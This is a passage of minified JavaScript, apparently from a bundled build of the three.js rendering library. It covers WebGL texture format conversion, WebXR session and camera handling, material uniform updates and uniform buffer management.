Pe=0;Pe<b.length;Pe++){n.bindFramebuffer(t.FRAMEBUFFER,Ae.__webglMultisampledFramebuffer),t.framebufferRenderbuffer(t.FRAMEBUFFER,t.COLOR_ATTACHMENT0+Pe,t.RENDERBUFFER,Ae.__webglColorRenderbuffer[Pe]);const re=i.get(b[Pe]).__webglTexture;n.bindFramebuffer(t.FRAMEBUFFER,Ae.__webglFramebuffer),t.framebufferTexture2D(t.DRAW_FRAMEBUFFER,t.COLOR_ATTACHMENT0+Pe,t.TEXTURE_2D,re,0)}n.bindFramebuffer(t.DRAW_FRAMEBUFFER,Ae.__webglMultisampledFramebuffer)}else if(R.depthBuffer&&R.resolveDepthBuffer===!1&&l){const b=R.stencilBuffer?t.DEPTH_STENCIL_ATTACHMENT:t.DEPTH_ATTACHMENT;t.invalidateFramebuffer(t.DRAW_FRAMEBUFFER,[b])}}}function P(R){return Math.min(s.maxSamples,R.samples)}function Et(R){const b=i.get(R);return R.samples>0&&e.has("WEBGL_multisampled_render_to_texture")===!0&&b.__useRenderToTexture!==!1}function Qe(R){const b=a.render.frame;h.get(R)!==b&&(h.set(R,b),R.update())}function lt(R,b){const U=R.colorSpace,Q=R.format,te=R.type;return R.isCompressedTexture===!0||R.isVideoTexture===!0||U!==Fr&&U!==$i&&(je.getTransfer(U)===it?(Q!==qn||te!==_n)&&Ie("WebGLTextures: sRGB encoded textures have to use RGBAFormat and UnsignedByteType."):Ze("WebGLTextures: Unsupported texture color space:",U)),b}function Ee(R){return typeof HTMLImageElement<"u"&&R instanceof HTMLImageElement?(c.width=R.naturalWidth||R.width,c.height=R.naturalHeight||R.height):typeof VideoFrame<"u"&&R instanceof VideoFrame?(c.width=R.displayWidth,c.height=R.displayHeight):(c.width=R.width,c.height=R.height),c}this.allocateTextureUnit=V,this.resetTextureUnits=H,this.setTexture2D=j,this.setTexture2DArray=X,this.setTexture3D=D,this.setTextureCube=N,this.rebindTextures=Nt,this.setupRenderTarget=We,this.updateRenderTargetMipmap=et,this.updateMultisampleRenderTarget=Mt,this.setupDepthRenderbuffer=$e,this.setupFrameBufferTexture=_e,this.useMultisampledRTT=Et,this.isReversedDepthBuffer=function(){return n.buffers.depth.getReversed()}}function mC(t,e){function n(i,s=$i){let r;const a=je.getTransfer(s);if(i===_n)return t.UNSIGNED_BYTE;if(i===fp)return t.UNSIGNED_SHORT_4_4_4_4;if(i===mp)return t.UNSIGNED_SHORT_5_5_5_1;if(i===Z0)return t.UNSIGNED_INT_5_9_9_9_REV;if(i===J0)return t.UNSIGNED_INT_10F_11F_11F_REV;if(i===$0)return t.BYTE;if(i===K0)return t.SHORT;if(i===Xa)return t.UNSIGNED_SHORT;if(i===pp)return t.INT;if(i===di)return t.UNSIGNED_INT;if(i===si)return t.FLOAT;if(i===Ii)return t.HALF_FLOAT;if(i===Q0)return t.ALPHA;if(i===ey)return t.RGB;if(i===qn)return t.RGBA;if(i===Di)return t.DEPTH_COMPONENT;if(i===Ns)return t.DEPTH_STENCIL;if(i===ty)return t.RED;if(i===gp)return t.RED_INTEGER;if(i===Or)return t.RG;if(i===vp)return t.RG_INTEGER;if(i===yp)return t.RGBA_INTEGER;if(i===cl||i===ul||i===dl||i===hl)if(a===it)if(r=e.get("WEBGL_compressed_texture_s3tc_srgb"),r!==null){if(i===cl)return r.COMPRESSED_SRGB_S3TC_DXT1_EXT;if(i===ul)return r.COMPRESSED_SRGB_ALPHA_S3TC_DXT1_EXT;if(i===dl)return r.COMPRESSED_SRGB_ALPHA_S3TC_DXT3_EXT;if(i===hl)return r.COMPRESSED_SRGB_ALPHA_S3TC_DXT5_EXT}else return null;else if(r=e.get("WEBGL_compressed_texture_s3tc"),r!==null){if(i===cl)return r.COMPRESSED_RGB_S3TC_DXT1_EXT;if(i===ul)return r.COMPRESSED_RGBA_S3TC_DXT1_EXT;if(i===dl)return r.COMPRESSED_RGBA_S3TC_DXT3_EXT;if(i===hl)return r.COMPRESSED_RGBA_S3TC_DXT5_EXT}else return null;if(i===Id||i===Dd||i===Ud||i===Od)if(r=e.get("WEBGL_compressed_texture_pvrtc"),r!==null){if(i===Id)return r.COMPRESSED_RGB_PVRTC_4BPPV1_IMG;if(i===Dd)return r.COMPRESSED_RGB_PVRTC_2BPPV1_IMG;if(i===Ud)return r.COMPRESSED_RGBA_PVRTC_4BPPV1_IMG;if(i===Od)return r.COMPRESSED_RGBA_PVRTC_2BPPV1_IMG}else return null;if(i===Fd||i===Bd||i===zd||i===Vd||i===Hd||i===Gd||i===Wd)if(r=e.get("WEBGL_compressed_texture_etc"),r!==null){if(i===Fd||i===Bd)return a===it?r.COMPRESSED_SRGB8_ETC2:r.COMPRESSED_RGB8_ETC2;if(i===zd)return a===it?r.COMPRESSED_SRGB8_ALPHA8_ETC2_EAC:r.COMPRESSED_RGBA8_ETC2_EAC;if(i===Vd)return r.COMPRESSED_R11_EAC;if(i===Hd)return r.COMPRESSED_SIGNED_R11_EAC;if(i===Gd)return r.COMPRESSED_RG11_EAC;if(i===Wd)return r.COMPRESSED_SIGNED_RG11_EAC}else return null;if(i===jd||i===Xd||i===qd||i===Yd||i===$d||i===Kd||i===Zd||i===Jd||i===Qd||i===eh||i===th||i===nh||i===ih||i===sh)if(r=e.get("WEBGL_compressed_texture_astc"),r!==null){if(i===jd)return a===it?r.COMPRESSED_SRGB8_ALPHA8_ASTC_4x4_KHR:r.COMPRESSED_RGBA_ASTC_4x4_KHR;if(i===Xd)return a===it?r.COMPRESSED_SRGB8_ALPHA8_ASTC_5x4_KHR:r.COMPRESSED_RGBA_ASTC_5x4_KHR;if(i===qd)return a===it?r.COMPRESSED_SRGB8_ALPHA8_ASTC_5x5_KHR:r.COMPRESSED_RGBA_ASTC_5x5_KHR;if(i===Yd)return a===it?r.COMPRESSED_SRGB8_ALPHA8_ASTC_6x5_KHR:r.COMPRESSED_RGBA_ASTC_6x5_KHR;if(i===$d)return a===it?r.COMPRESSED_SRGB8_ALPHA8_ASTC_6x6_KHR:r.COMPRESSED_RGBA_ASTC_6x6_KHR;if(i===Kd)return a===it?r.COMPRESSED_SRGB8_ALPHA8_ASTC_8x5_KHR:r.COMPRESSED_RGBA_ASTC_8x5_KHR;if(i===Zd)return a===it?r.COMPRESSED_SRGB8_ALPHA8_ASTC_8x6_KHR:r.COMPRESSED_RGBA_ASTC_8x6_KHR;if(i===Jd)return a===it?r.COMPRESSED_SRGB8_ALPHA8_ASTC_8x8_KHR:r.COMPRESSED_RGBA_ASTC_8x8_KHR;if(i===Qd)return a===it?r.COMPRESSED_SRGB8_ALPHA8_ASTC_10x5_KHR:r.COMPRESSED_RGBA_ASTC_10x5_KHR;if(i===eh)return a===it?r.COMPRESSED_SRGB8_ALPHA8_ASTC_10x6_KHR:r.COMPRESSED_RGBA_ASTC_10x6_KHR;if(i===th)return a===it?r.COMPRESSED_SRGB8_ALPHA8_ASTC_10x8_KHR:r.COMPRESSED_RGBA_ASTC_10x8_KHR;if(i===nh)return a===it?r.COMPRESSED_SRGB8_ALPHA8_ASTC_10x10_KHR:r.COMPRESSED_RGBA_ASTC_10x10_KHR;if(i===ih)return a===it?r.COMPRESSED_SRGB8_ALPHA8_ASTC_12x10_KHR:r.COMPRESSED_RGBA_ASTC_12x10_KHR;if(i===sh)return a===it?r.COMPRESSED_SRGB8_ALPHA8_ASTC_12x12_KHR:r.COMPRESSED_RGBA_ASTC_12x12_KHR}else return null;if(i===rh||i===ah||i===oh)if(r=e.get("EXT_texture_compression_bptc"),r!==null){if(i===rh)return a===it?r.COMPRESSED_SRGB_ALPHA_BPTC_UNORM_EXT:r.COMPRESSED_RGBA_BPTC_UNORM_EXT;if(i===ah)return r.COMPRESSED_RGB_BPTC_SIGNED_FLOAT_EXT;if(i===oh)return r.COMPRESSED_RGB_BPTC_UNSIGNED_FLOAT_EXT}else return null;if(i===lh||i===ch||i===uh||i===dh)if(r=e.get("EXT_texture_compression_rgtc"),r!==null){if(i===lh)return r.COMPRESSED_RED_RGTC1_EXT;if(i===ch)return r.COMPRESSED_SIGNED_RED_RGTC1_EXT;if(i===uh)return r.COMPRESSED_RED_GREEN_RGTC2_EXT;if(i===dh)return r.COMPRESSED_SIGNED_RED_GREEN_RGTC2_EXT}else return null;return i===qa?t.UNSIGNED_INT_24_8:t[i]!==void 0?t[i]:null}return{convert:n}}const gC=`
void main() {

	gl_Position = vec4( position, 1.0 );

}`,vC=`
uniform sampler2DArray depthColor;
uniform float depthWidth;
uniform float depthHeight;

void main() {

	vec2 coord = vec2( gl_FragCoord.x / depthWidth, gl_FragCoord.y / depthHeight );

	if ( coord.x >= 1.0 ) {

		gl_FragDepth = texture( depthColor, vec3( coord.x - 1.0, coord.y, 1 ) ).r;

	} else {

		gl_FragDepth = texture( depthColor, vec3( coord.x, coord.y, 0 ) ).r;

	}

}`;class yC{constructor(){this.texture=null,this.mesh=null,this.depthNear=0,this.depthFar=0}init(e,n){if(this.texture===null){const i=new py(e.texture);(e.depthNear!==n.depthNear||e.depthFar!==n.depthFar)&&(this.depthNear=e.depthNear,this.depthFar=e.depthFar),this.texture=i}}getMesh(e){if(this.texture!==null&&this.mesh===null){const n=e.cameras[0].viewport,i=new pi({vertexShader:gC,fragmentShader:vC,uniforms:{depthColor:{value:this.texture},depthWidth:{value:n.z},depthHeight:{value:n.w}}});this.mesh=new In(new oc(20,20),i)}return this.mesh}reset(){this.texture=null,this.mesh=null}getDepthTexture(){return this.texture}}class xC extends Wr{constructor(e,n){super();const i=this;let s=null,r=1,a=null,o="local-floor",l=1,c=null,h=null,d=null,p=null,f=null,y=null;const _=typeof XRWebGLBinding<"u",g=new yC,u={},v=n.getContextAttributes();let x=null,S=null;const E=[],A=[],C=new Je;let L=null;const w=new xn;w.viewport=new bt;const M=new xn;M.viewport=new bt;const k=[w,M],H=new CM;let V=null,W=null;this.cameraAutoUpdate=!0,this.enabled=!1,this.isPresenting=!1,this.getController=function(Z){let ne=E[Z];return ne===void 0&&(ne=new gu,E[Z]=ne),ne.getTargetRaySpace()},this.getControllerGrip=function(Z){let ne=E[Z];return ne===void 0&&(ne=new gu,E[Z]=ne),ne.getGripSpace()},this.getHand=function(Z){let ne=E[Z];return ne===void 0&&(ne=new gu,E[Z]=ne),ne.getHandSpace()};function j(Z){const ne=A.indexOf(Z.inputSource);if(ne===-1)return;const _e=E[ne];_e!==void 0&&(_e.update(Z.inputSource,Z.frame,c||a),_e.dispatchEvent({type:Z.type,data:Z.inputSource}))}function X(){s.removeEventListener("select",j),s.removeEventListener("selectstart",j),s.removeEventListener("selectend",j),s.removeEventListener("squeeze",j),s.removeEventListener("squeezestart",j),s.removeEventListener("squeezeend",j),s.removeEventListener("end",X),s.removeEventListener("inputsourceschange",D);for(let Z=0;Z<E.length;Z++){const ne=A[Z];ne!==null&&(A[Z]=null,E[Z].disconnect(ne))}V=null,W=null,g.reset();for(const Z in u)delete u[Z];e.setRenderTarget(x),f=null,p=null,d=null,s=null,S=null,Ye.stop(),i.isPresenting=!1,e.setPixelRatio(L),e.setSize(C.width,C.height,!1),i.dispatchEvent({type:"sessionend"})}this.setFramebufferScaleFactor=function(Z){r=Z,i.isPresenting===!0&&Ie("WebXRManager: Cannot change framebuffer scale while presenting.")},this.setReferenceSpaceType=function(Z){o=Z,i.isPresenting===!0&&Ie("WebXRManager: Cannot change reference space type while presenting.")},this.getReferenceSpace=function(){return c||a},this.setReferenceSpace=function(Z){c=Z},this.getBaseLayer=function(){return p!==null?p:f},this.getBinding=function(){return d===null&&_&&(d=new XRWebGLBinding(s,n)),d},this.getFrame=function(){return y},this.getSession=function(){return s},this.setSession=async function(Z){if(s=Z,s!==null){if(x=e.getRenderTarget(),s.addEventListener("select",j),s.addEventListener("selectstart",j),s.addEventListener("selectend",j),s.addEventListener("squeeze",j),s.addEventListener("squeezestart",j),s.addEventListener("squeezeend",j),s.addEventListener("end",X),s.addEventListener("inputsourceschange",D),v.xrCompatible!==!0&&await n.makeXRCompatible(),L=e.getPixelRatio(),e.getSize(C),_&&"createProjectionLayer"in XRWebGLBinding.prototype){let _e=null,De=null,we=null;v.depth&&(we=v.stencil?n.DEPTH24_STENCIL8:n.DEPTH_COMPONENT24,_e=v.stencil?Ns:Di,De=v.stencil?qa:di);const $e={colorFormat:n.RGBA8,depthFormat:we,scaleFactor:r};d=this.getBinding(),p=d.createProjectionLayer($e),s.updateRenderState({layers:[p]}),e.setPixelRatio(1),e.setSize(p.textureWidth,p.textureHeight,!1),S=new ci(p.textureWidth,p.textureHeight,{format:qn,type:_n,depthTexture:new $a(p.textureWidth,p.textureHeight,De,void 0,void 0,void 0,void 0,void 0,void 0,_e),stencilBuffer:v.stencil,colorSpace:e.outputColorSpace,samples:v.antialias?4:0,resolveDepthBuffer:p.ignoreDepthValues===!1,resolveStencilBuffer:p.ignoreDepthValues===!1})}else{const _e={antialias:v.antialias,alpha:!0,depth:v.depth,stencil:v.stencil,framebufferScaleFactor:r};f=new XRWebGLLayer(s,n,_e),s.updateRenderState({baseLayer:f}),e.setPixelRatio(1),e.setSize(f.framebufferWidth,f.framebufferHeight,!1),S=new ci(f.framebufferWidth,f.framebufferHeight,{format:qn,type:_n,colorSpace:e.outputColorSpace,stencilBuffer:v.stencil,resolveDepthBuffer:f.ignoreDepthValues===!1,resolveStencilBuffer:f.ignoreDepthValues===!1})}S.isXRRenderTarget=!0,this.setFoveation(l),c=null,a=await s.requestReferenceSpace(o),Ye.setContext(s),Ye.start(),i.isPresenting=!0,i.dispatchEvent({type:"sessionstart"})}},this.getEnvironmentBlendMode=function(){if(s!==null)return s.environmentBlendMode},this.getDepthTexture=function(){return g.getDepthTexture()};function D(Z){for(let ne=0;ne<Z.removed.length;ne++){const _e=Z.removed[ne],De=A.indexOf(_e);De>=0&&(A[De]=null,E[De].disconnect(_e))}for(let ne=0;ne<Z.added.length;ne++){const _e=Z.added[ne];let De=A.indexOf(_e);if(De===-1){for(let $e=0;$e<E.length;$e++)if($e>=A.length){A.push(_e),De=$e;break}else if(A[$e]===null){A[$e]=_e,De=$e;break}if(De===-1)break}const we=E[De];we&&we.connect(_e)}}const N=new G,O=new G;function B(Z,ne,_e){N.setFromMatrixPosition(ne.matrixWorld),O.setFromMatrixPosition(_e.matrixWorld);const De=N.distanceTo(O),we=ne.projectionMatrix.elements,$e=_e.projectionMatrix.elements,Nt=we[14]/(we[10]-1),We=we[14]/(we[10]+1),et=(we[9]+1)/we[5],at=(we[9]-1)/we[5],Fe=(we[8]-1)/we[0],Mt=($e[8]+1)/$e[0],P=Nt*Fe,Et=Nt*Mt,Qe=De/(-Fe+Mt),lt=Qe*-Fe;if(ne.matrixWorld.decompose(Z.position,Z.quaternion,Z.scale),Z.translateX(lt),Z.translateZ(Qe),Z.matrixWorld.compose(Z.position,Z.quaternion,Z.scale),Z.matrixWorldInverse.copy(Z.matrixWorld).invert(),we[10]===-1)Z.projectionMatrix.copy(ne.projectionMatrix),Z.projectionMatrixInverse.copy(ne.projectionMatrixInverse);else{const Ee=Nt+Qe,R=We+Qe,b=P-lt,U=Et+(De-lt),Q=et*We/R*Ee,te=at*We/R*Ee;Z.projectionMatrix.makePerspective(b,U,Q,te,Ee,R),Z.projectionMatrixInverse.copy(Z.projectionMatrix).invert()}}function J(Z,ne){ne===null?Z.matrixWorld.copy(Z.matrix):Z.matrixWorld.multiplyMatrices(ne.matrixWorld,Z.matrix),Z.matrixWorldInverse.copy(Z.matrixWorld).invert()}this.updateCamera=function(Z){if(s===null)return;let ne=Z.near,_e=Z.far;g.texture!==null&&(g.depthNear>0&&(ne=g.depthNear),g.depthFar>0&&(_e=g.depthFar)),H.near=M.near=w.near=ne,H.far=M.far=w.far=_e,(V!==H.near||W!==H.far)&&(s.updateRenderState({depthNear:H.near,depthFar:H.far}),V=H.near,W=H.far),H.layers.mask=Z.layers.mask|6,w.layers.mask=H.layers.mask&3,M.layers.mask=H.layers.mask&5;const De=Z.parent,we=H.cameras;J(H,De);for(let $e=0;$e<we.length;$e++)J(we[$e],De);we.length===2?B(H,w,M):H.projectionMatrix.copy(w.projectionMatrix),oe(Z,H,De)};function oe(Z,ne,_e){_e===null?Z.matrix.copy(ne.matrixWorld):(Z.matrix.copy(_e.matrixWorld),Z.matrix.invert(),Z.matrix.multiply(ne.matrixWorld)),Z.matrix.decompose(Z.position,Z.quaternion,Z.scale),Z.updateMatrixWorld(!0),Z.projectionMatrix.copy(ne.projectionMatrix),Z.projectionMatrixInverse.copy(ne.projectionMatrixInverse),Z.isPerspectiveCamera&&(Z.fov=hh*2*Math.atan(1/Z.projectionMatrix.elements[5]),Z.zoom=1)}this.getCamera=function(){return H},this.getFoveation=function(){if(!(p===null&&f===null))return l},this.setFoveation=function(Z){l=Z,p!==null&&(p.fixedFoveation=Z),f!==null&&f.fixedFoveation!==void 0&&(f.fixedFoveation=Z)},this.hasDepthSensing=function(){return g.texture!==null},this.getDepthSensingMesh=function(){return g.getMesh(H)},this.getCameraTexture=function(Z){return u[Z]};let ge=null;function ze(Z,ne){if(h=ne.getViewerPose(c||a),y=ne,h!==null){const _e=h.views;f!==null&&(e.setRenderTargetFramebuffer(S,f.framebuffer),e.setRenderTarget(S));let De=!1;_e.length!==H.cameras.length&&(H.cameras.length=0,De=!0);for(let We=0;We<_e.length;We++){const et=_e[We];let at=null;if(f!==null)at=f.getViewport(et);else{const Mt=d.getViewSubImage(p,et);at=Mt.viewport,We===0&&(e.setRenderTargetTextures(S,Mt.colorTexture,Mt.depthStencilTexture),e.setRenderTarget(S))}let Fe=k[We];Fe===void 0&&(Fe=new xn,Fe.layers.enable(We),Fe.viewport=new bt,k[We]=Fe),Fe.matrix.fromArray(et.transform.matrix),Fe.matrix.decompose(Fe.position,Fe.quaternion,Fe.scale),Fe.projectionMatrix.fromArray(et.projectionMatrix),Fe.projectionMatrixInverse.copy(Fe.projectionMatrix).invert(),Fe.viewport.set(at.x,at.y,at.width,at.height),We===0&&(H.matrix.copy(Fe.matrix),H.matrix.decompose(H.position,H.quaternion,H.scale)),De===!0&&H.cameras.push(Fe)}const we=s.enabledFeatures;if(we&&we.includes("depth-sensing")&&s.depthUsage=="gpu-optimized"&&_){d=i.getBinding();const We=d.getDepthInformation(_e[0]);We&&We.isValid&&We.texture&&g.init(We,s.renderState)}if(we&&we.includes("camera-access")&&_){e.state.unbindTexture(),d=i.getBinding();for(let We=0;We<_e.length;We++){const et=_e[We].camera;if(et){let at=u[et];at||(at=new py,u[et]=at);const Fe=d.getCameraImage(et);at.sourceTexture=Fe}}}}for(let _e=0;_e<E.length;_e++){const De=A[_e],we=E[_e];De!==null&&we!==void 0&&we.update(De,ne,c||a)}ge&&ge(Z,ne),ne.detectedPlanes&&i.dispatchEvent({type:"planesdetected",data:ne}),y=null}const Ye=new my;Ye.setAnimationLoop(ze),this.setAnimationLoop=function(Z){ge=Z},this.dispose=function(){}}}const ws=new hi,_C=new St;function bC(t,e){function n(g,u){g.matrixAutoUpdate===!0&&g.updateMatrix(),u.value.copy(g.matrix)}function i(g,u){u.color.getRGB(g.fogColor.value,cy(t)),u.isFog?(g.fogNear.value=u.near,g.fogFar.value=u.far):u.isFogExp2&&(g.fogDensity.value=u.density)}function s(g,u,v,x,S){u.isMeshBasicMaterial||u.isMeshLambertMaterial?r(g,u):u.isMeshToonMaterial?(r(g,u),d(g,u)):u.isMeshPhongMaterial?(r(g,u),h(g,u)):u.isMeshStandardMaterial?(r(g,u),p(g,u),u.isMeshPhysicalMaterial&&f(g,u,S)):u.isMeshMatcapMaterial?(r(g,u),y(g,u)):u.isMeshDepthMaterial?r(g,u):u.isMeshDistanceMaterial?(r(g,u),_(g,u)):u.isMeshNormalMaterial?r(g,u):u.isLineBasicMaterial?(a(g,u),u.isLineDashedMaterial&&o(g,u)):u.isPointsMaterial?l(g,u,v,x):u.isSpriteMaterial?c(g,u):u.isShadowMaterial?(g.color.value.copy(u.color),g.opacity.value=u.opacity):u.isShaderMaterial&&(u.uniformsNeedUpdate=!1)}function r(g,u){g.opacity.value=u.opacity,u.color&&g.diffuse.value.copy(u.color),u.emissive&&g.emissive.value.copy(u.emissive).multiplyScalar(u.emissiveIntensity),u.map&&(g.map.value=u.map,n(u.map,g.mapTransform)),u.alphaMap&&(g.alphaMap.value=u.alphaMap,n(u.alphaMap,g.alphaMapTransform)),u.bumpMap&&(g.bumpMap.value=u.bumpMap,n(u.bumpMap,g.bumpMapTransform),g.bumpScale.value=u.bumpScale,u.side===pn&&(g.bumpScale.value*=-1)),u.normalMap&&(g.normalMap.value=u.normalMap,n(u.normalMap,g.normalMapTransform),g.normalScale.value.copy(u.normalScale),u.side===pn&&g.normalScale.value.negate()),u.displacementMap&&(g.displacementMap.value=u.displacementMap,n(u.displacementMap,g.displacementMapTransform),g.displacementScale.value=u.displacementScale,g.displacementBias.value=u.displacementBias),u.emissiveMap&&(g.emissiveMap.value=u.emissiveMap,n(u.emissiveMap,g.emissiveMapTransform)),u.specularMap&&(g.specularMap.value=u.specularMap,n(u.specularMap,g.specularMapTransform)),u.alphaTest>0&&(g.alphaTest.value=u.alphaTest);const v=e.get(u),x=v.envMap,S=v.envMapRotation;x&&(g.envMap.value=x,ws.copy(S),ws.x*=-1,ws.y*=-1,ws.z*=-1,x.isCubeTexture&&x.isRenderTargetTexture===!1&&(ws.y*=-1,ws.z*=-1),g.envMapRotation.value.setFromMatrix4(_C.makeRotationFromEuler(ws)),g.flipEnvMap.value=x.isCubeTexture&&x.isRenderTargetTexture===!1?-1:1,g.reflectivity.value=u.reflectivity,g.ior.value=u.ior,g.refractionRatio.value=u.refractionRatio),u.lightMap&&(g.lightMap.value=u.lightMap,g.lightMapIntensity.value=u.lightMapIntensity,n(u.lightMap,g.lightMapTransform)),u.aoMap&&(g.aoMap.value=u.aoMap,g.aoMapIntensity.value=u.aoMapIntensity,n(u.aoMap,g.aoMapTransform))}function a(g,u){g.diffuse.value.copy(u.color),g.opacity.value=u.opacity,u.map&&(g.map.value=u.map,n(u.map,g.mapTransform))}function o(g,u){g.dashSize.value=u.dashSize,g.totalSize.value=u.dashSize+u.gapSize,g.scale.value=u.scale}function l(g,u,v,x){g.diffuse.value.copy(u.color),g.opacity.value=u.opacity,g.size.value=u.size*v,g.scale.value=x*.5,u.map&&(g.map.value=u.map,n(u.map,g.uvTransform)),u.alphaMap&&(g.alphaMap.value=u.alphaMap,n(u.alphaMap,g.alphaMapTransform)),u.alphaTest>0&&(g.alphaTest.value=u.alphaTest)}function c(g,u){g.diffuse.value.copy(u.color),g.opacity.value=u.opacity,g.rotation.value=u.rotation,u.map&&(g.map.value=u.map,n(u.map,g.mapTransform)),u.alphaMap&&(g.alphaMap.value=u.alphaMap,n(u.alphaMap,g.alphaMapTransform)),u.alphaTest>0&&(g.alphaTest.value=u.alphaTest)}function h(g,u){g.specular.value.copy(u.specular),g.shininess.value=Math.max(u.shininess,1e-4)}function d(g,u){u.gradientMap&&(g.gradientMap.value=u.gradientMap)}function p(g,u){g.metalness.value=u.metalness,u.metalnessMap&&(g.metalnessMap.value=u.metalnessMap,n(u.metalnessMap,g.metalnessMapTransform)),g.roughness.value=u.roughness,u.roughnessMap&&(g.roughnessMap.value=u.roughnessMap,n(u.roughnessMap,g.roughnessMapTransform)),u.envMap&&(g.envMapIntensity.value=u.envMapIntensity)}function f(g,u,v){g.ior.value=u.ior,u.sheen>0&&(g.sheenColor.value.copy(u.sheenColor).multiplyScalar(u.sheen),g.sheenRoughness.value=u.sheenRoughness,u.sheenColorMap&&(g.sheenColorMap.value=u.sheenColorMap,n(u.sheenColorMap,g.sheenColorMapTransform)),u.sheenRoughnessMap&&(g.sheenRoughnessMap.value=u.sheenRoughnessMap,n(u.sheenRoughnessMap,g.sheenRoughnessMapTransform))),u.clearcoat>0&&(g.clearcoat.value=u.clearcoat,g.clearcoatRoughness.value=u.clearcoatRoughness,u.clearcoatMap&&(g.clearcoatMap.value=u.clearcoatMap,n(u.clearcoatMap,g.clearcoatMapTransform)),u.clearcoatRoughnessMap&&(g.clearcoatRoughnessMap.value=u.clearcoatRoughnessMap,n(u.clearcoatRoughnessMap,g.clearcoatRoughnessMapTransform)),u.clearcoatNormalMap&&(g.clearcoatNormalMap.value=u.clearcoatNormalMap,n(u.clearcoatNormalMap,g.clearcoatNormalMapTransform),g.clearcoatNormalScale.value.copy(u.clearcoatNormalScale),u.side===pn&&g.clearcoatNormalScale.value.negate())),u.dispersion>0&&(g.dispersion.value=u.dispersion),u.iridescence>0&&(g.iridescence.value=u.iridescence,g.iridescenceIOR.value=u.iridescenceIOR,g.iridescenceThicknessMinimum.value=u.iridescenceThicknessRange[0],g.iridescenceThicknessMaximum.value=u.iridescenceThicknessRange[1],u.iridescenceMap&&(g.iridescenceMap.value=u.iridescenceMap,n(u.iridescenceMap,g.iridescenceMapTransform)),u.iridescenceThicknessMap&&(g.iridescenceThicknessMap.value=u.iridescenceThicknessMap,n(u.iridescenceThicknessMap,g.iridescenceThicknessMapTransform))),u.transmission>0&&(g.transmission.value=u.transmission,g.transmissionSamplerMap.value=v.texture,g.transmissionSamplerSize.value.set(v.width,v.height),u.transmissionMap&&(g.transmissionMap.value=u.transmissionMap,n(u.transmissionMap,g.transmissionMapTransform)),g.thickness.value=u.thickness,u.thicknessMap&&(g.thicknessMap.value=u.thicknessMap,n(u.thicknessMap,g.thicknessMapTransform)),g.attenuationDistance.value=u.attenuationDistance,g.attenuationColor.value.copy(u.attenuationColor)),u.anisotropy>0&&(g.anisotropyVector.value.set(u.anisotropy*Math.cos(u.anisotropyRotation),u.anisotropy*Math.sin(u.anisotropyRotation)),u.anisotropyMap&&(g.anisotropyMap.value=u.anisotropyMap,n(u.anisotropyMap,g.anisotropyMapTransform))),g.specularIntensity.value=u.specularIntensity,g.specularColor.value.copy(u.specularColor),u.specularColorMap&&(g.specularColorMap.value=u.specularColorMap,n(u.specularColorMap,g.specularColorMapTransform)),u.specularIntensityMap&&(g.specularIntensityMap.value=u.specularIntensityMap,n(u.specularIntensityMap,g.specularIntensityMapTransform))}function y(g,u){u.matcap&&(g.matcap.value=u.matcap)}function _(g,u){const v=e.get(u).light;g.referencePosition.value.setFromMatrixPosition(v.matrixWorld),g.nearDistance.value=v.shadow.camera.near,g.farDistance.value=v.shadow.camera.far}return{refreshFogUniforms:i,refreshMaterialUniforms:s}}function SC(t,e,n,i){let s={},r={},a=[];const o=t.getParameter(t.MAX_UNIFORM_BUFFER_BINDINGS);function l(v,x){const S=x.program;i.uniformBlockBinding(v,S)}function c(v,x){let S=s[v.id];S===void 0&&(y(v),S=h(v),s[v.id]=S,v.addEventListener("dispose",g));const E=x.program;i.updateUBOMapping(v,E);const A=e.render.frame;r[v.id]!==A&&(p(v),r[v.id]=A)}function h(v){const x=d();v.__bindingPointIndex=x;const S=t.createBuffer(),E=v.__size,A=v.usage;return t.bindBuffer(t.UNIFORM_BUFFER,S),t.bufferData(t.UNIFORM_BUFFER,E,A),t.bindBuffer(t.UNIFORM_BUFFER,null),t.bindBufferBase(t.UNIFORM_BUFFER,x,S),S}function d(){for(let v=0;v<o;v++)if(a.indexOf(v)===-1)return a.push(v),v;return Ze("WebGLRenderer: Maximum number of simultaneously usable uniforms groups reached."),0}function p(v){const x=s[v.id],S=v.uniforms,E=v.__cache;t.bindBuffer(t.UNIFORM_BUFFER,x);for(let A=0,C=S.length;A<C;A++){const L=Array.isArray(S[A])?S[A]:[S[A]];for(let w=0,M=L.length;w<M;w++){const k=L[w];if(f(k,A,w,E)===!0){const H=k.__offset,V=Array.isArray(k.value)?k.value:[k.value];let W=0;for(let j=0;j<V.length;j++){const X=V[j],D=_(X);typeof X=="number"||typeof X=="boolean"?(k.__data[0]=X,t.bufferSubData(t.UNIFORM_BUFFER,H+W,k.__data)):X.isMatrix3?(k.__data[0]=X.elements[0],k.__data[1]=X.elements[1],k.__data[2]=X.elements[2],k.__data[3]=0,k.__data[4]=X.elements[3],k.__data[5]=X.elements[4],k.__data[6]=X.elements[5],k.__data[7]=0,k.__data[8]=X.elements[6],k.__data[9]=X.elements[7],k.__data[10]=X.elements[8],k.__data[11]=0):(X.toArray(k.__data,W),W+=D.storage/Float32Array.BYTES_PER_ELEMENT)}t.bufferSubData(t.UNIFORM_BUFFER,H,k.__data)}}}t.bindBuffer(t.UNIFORM_BUFFER,null)}function f(v,x,S,E){const A=v.value,C=x+"_"+S;if(E[C]===void 0)return typeof A=="number"||typeof A=="boolean"?E[C]=A:E[C]=A.clone(),!0;{const L=E[C];if(typeof A=="number"||typeof A=="boolean"){if(L!==A)return E[C]=A,!0}else if(L.equals(A)===!1)return L.copy(A),!0}return!1}function y(v){const x=v.uniforms;let S=0;const E=16;for(let C=0,L=x.length;C<L;C++){const w=Array.isArray(x[C])?x[C]:[x[C]];for(let M=0,k=w.length;M<k;M++){const H=w[M],V=Array.isArray(H.value)?H.value:[H.value];for(let W=0,j=V.length;W<j;W++){const X=V[W],D=_(X),N=S%E,O=N%D.boundary,B=N+O;S+=O,B!==0&&E-B<D.storage&&(S+=E-B),H.__data=new Float32Array(D.storage/Float32Array.BYTES_PER_ELEMENT),H.__offset=S,S+=D.storage}}}const A=S%E;return A>0&&(S+=E-A),v.__size=S,v.__cache={},this}function _(v){const x={boundary:0,storage:0};return typeof v=="number"||typeof v=="boolean"?(x.boundary=4,x.storage=4):v.isVector2?(x.boundary=8,x.storage=8):v.isVector3||v.isColor?(x.boundary=16,x.storage=12):v.isVector4?(x.boundary=16,x.storage=16):v.isMatrix3?(x.boundary=48,x.storage=48):v.isMatrix4?(x.boundary=64,x.storage=64):v.isTexture?Ie("WebGLRenderer: Texture samplers can not be part of an uniforms group."):Ie("WebGLRenderer: Unsupported uniform value type.",v),x}function 